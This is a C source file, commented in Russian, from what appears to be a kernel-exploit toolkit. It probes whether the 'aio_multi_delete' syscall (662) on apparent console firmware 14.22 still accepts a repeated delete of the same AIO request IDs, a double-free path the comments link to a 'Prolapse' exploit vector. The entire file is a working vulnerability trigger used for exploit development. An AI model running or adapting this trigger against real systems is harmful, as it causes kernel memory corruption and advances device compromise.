/* t2_aio_del_reuse.c — probe aio_multi_delete (syscall 662, вектор Prolapse).
 * Prolapse (14.00/14.10) бьёт по aio_multi_delete; в 14.20 закрыт. Состояние на 14.22
 * неизвестно — этот зонд даёт дифференциальный ответ: принимает ли id-таблица
 * повторное удаление того же id (что означало бы незакрытый путь/двойное освобождение).
 * Детект: "DOUBLE-DELETE-ACCEPTED" в /data/kexpl-t2-aio-del.log.
 */
#include "kexpl.h"

#define N 8
static u8  reqs[N][0x40];
static u32 ids[N];
static u32 states[N];
static u8  sink[0x40];

int trig_main(void){
    zero_mem(ids, sizeof(ids));
    zero_mem(states, sizeof(states));
    zero_mem(sink, sizeof(sink));
    if (klog_init("t2-aio-del", 1)) return 1;
    log_tag("t2"); log_s("aio_multi_delete reuse probe (syscall 662)\n");

    int sv[2] = {0,0};
    i64 rc = sys4(SYS_socketpair, AF_UNIX, SOCK_STREAM, 0, (i64)sv);
    if (rc != 0) { log_tag("t2"); log_s("RESULT: SKIP socketpair rc="); log_l(rc); log_s("\n"); log_flush(1); return 0; }

    int n = 0;
    for (int i = 0; i < N; i++) {
        u8 *r = reqs[i];
        for (int j = 0; j < 0x40; j++) r[j] = 0;
        *(u32 *)(r + 0x08) = 1;
        *(u64 *)(r + 0x10) = (u64)sink;
        *(u32 *)(r + 0x20) = (u32)sv[0];
        u32 idout = 0;
        i64 s = sys5(SYS_aio_submit_cmd, 1, (i64)r, 1, 3, (i64)&idout);
        if (s == 0 && idout && idout < 0x100000) { ids[n++] = idout; }
        else log_tag("t2"), log_s("submit fail rc="), log_l(s), log_s("\n");
    }
    log_tag("t2"); log_s("submitted="); log_l(n); log_s("\n");
    if (n < 2) { log_tag("t2"); log_s("RESULT: SKIP (нет висящих AIO-запросов)\n"); sys1(SYS_close, sv[0]); log_flush(1); return 0; }

    i64 d1 = sys3(SYS_aio_multi_delete, (i64)ids, n, (i64)states);
    log_tag("t2"); log_s("aio_multi_delete#1 rc="); log_l(d1); log_s("\n");
    i64 d2 = sys3(SYS_aio_multi_delete, (i64)ids, n, (i64)states);
    log_tag("t2"); log_s("aio_multi_delete#2 rc="); log_l(d2); log_s("\n");

    /* точечно: удалить один и тот же одиночный id дважды */
    u32 one = ids[0];
    i64 s1 = sys3(SYS_aio_multi_delete, (i64)&one, 1, (i64)states);
    i64 s2 = sys3(SYS_aio_multi_delete, (i64)&one, 1, (i64)states);
    log_tag("t2"); log_s("single delete rc1="); log_l(s1); log_s(" rc2="); log_l(s2); log_s("\n");

    sys1(SYS_close, sv[0]); sys1(SYS_close, sv[1]);
    if (d2 == 0 || s2 == 0) {
        log_tag("t2"); log_s("RESULT: POSITIVE — повторное удаление принято (путь не закрыт / двойное освобождение)\n");
        log_flush(1); return 2;
    }
    log_tag("t2"); log_s("RESULT: NEGATIVE — повторное удаление отвергается (errno выше)\n");
    log_flush(1);
    return 0;
}
